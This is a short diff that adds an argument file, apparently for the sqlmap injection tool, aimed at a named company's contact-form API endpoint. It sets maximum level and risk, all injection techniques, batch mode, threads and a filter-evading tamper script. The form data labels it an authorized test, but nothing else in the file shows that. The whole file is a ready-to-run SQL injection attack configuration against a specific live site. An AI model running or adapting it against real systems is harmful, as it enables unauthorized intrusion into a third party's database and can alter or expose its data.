@@ -1,0 +1,11 @@
+-u
+https://www.infinitycapital.bh/api/send
+--data=fname=VaptQA&lname=Tester&areacode=%2B973&tel=3600000&cname=vapt-qa&subject=Inquiry&msg=Authorized+security+test+message&check=on&targets=%5B%22info%40infinitycapital.bh%22%5D
+--headers=Accept: application/json/*|Origin: https://www.infinitycapital.bh
+--method=POST
+--batch
+--level=5
+--risk=3
+--technique=BEUSTQ
+--threads=4
+--tamper=space2comment
